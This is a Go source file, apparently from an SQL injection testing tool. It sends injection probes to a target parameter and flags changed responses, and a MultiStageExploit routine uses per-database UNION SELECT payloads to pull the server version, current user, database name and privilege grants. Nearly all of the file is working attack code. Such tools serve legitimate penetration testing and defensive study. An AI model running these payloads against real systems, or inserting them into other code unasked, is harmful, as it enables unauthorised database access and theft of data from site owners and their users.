package core

import (
	"fmt"
	"strings"
)

type SecondOrderResult struct {
	Vulnerable bool
	TriggerURL string
	Payload    string
	Confidence float64
	DBMS       string
}

func (e *Engine) TestSecondOrder(param string, baseBody string) *SecondOrderResult {
	e.logInfo(fmt.Sprintf("Testing second-order injection on '%s'...", param))

	result := &SecondOrderResult{}

	testPayloads := []string{
		"'",
		"\"",
		"1'",
		"1' AND '1'='1",
		"1' OR '1'='1",
		"1' UNION SELECT 1--",
	}

	for _, payload := range testPayloads {
		processed := e.ApplyTamper(payload)

		body, _, _, err := e.Request(processed, param)
		if err != nil {
			continue
		}

		changes := detectChanges(baseBody, body)
		if changes > 2 {
			e.logVuln("Potential second-order injection with payload: %s", payload)
			e.logInfo(fmt.Sprintf("    Response changes: %d sections differ", changes))
			result.Vulnerable = true
			result.Payload = payload
			result.Confidence = 0.75
			break
		}
	}

	return result
}

func detectChanges(original string, modified string) int {
	changes := 0
	origLines := strings.Split(original, "\n")
	modLines := strings.Split(modified, "\n")

	maxLen := len(origLines)
	if len(modLines) < maxLen {
		maxLen = len(modLines)
	}

	for i := 0; i < maxLen; i++ {
		if origLines[i] != modLines[i] {
			changes++
			if changes > 5 {
				break
			}
		}
	}

	return changes
}

func (e *Engine) MultiStageExploit(param string, dbms string, stages []string) map[string]string {
	results := map[string]string{}
	comment := "--"
	if dbms == "MySQL" || dbms == "MariaDB" {
		comment = "-- "
	}

	for _, stage := range stages {
		var payload string
		switch stage {
		case "version":
			payload = fmt.Sprintf("' UNION SELECT @@version %s", comment)
			if dbms == "PostgreSQL" {
				payload = fmt.Sprintf("' UNION SELECT version() %s", comment)
			} else if dbms == "Oracle" {
				payload = "' UNION SELECT banner FROM v$version--"
			}
		case "user":
			payload = fmt.Sprintf("' UNION SELECT user() %s", comment)
			if dbms == "Oracle" {
				payload = "' UNION SELECT user FROM dual--"
			}
		case "database":
			payload = fmt.Sprintf("' UNION SELECT database() %s", comment)
			if dbms == "PostgreSQL" {
				payload = fmt.Sprintf("' UNION SELECT current_database() %s", comment)
			} else if dbms == "Oracle" {
				payload = "' UNION SELECT ora_database_name FROM dual--"
			}
		case "privs":
			payload = fmt.Sprintf("' UNION SELECT grantee, privilege_type FROM information_schema.user_privileges %s", comment)
		default:
			continue
		}

		body, _, _, err := e.Request(payload, param)
		if err != nil {
			results[stage] = fmt.Sprintf("error: %v", err)
		} else {
			results[stage] = strings.TrimSpace(body[:minInt(len(body), 200)])
		}
	}

	return results
}
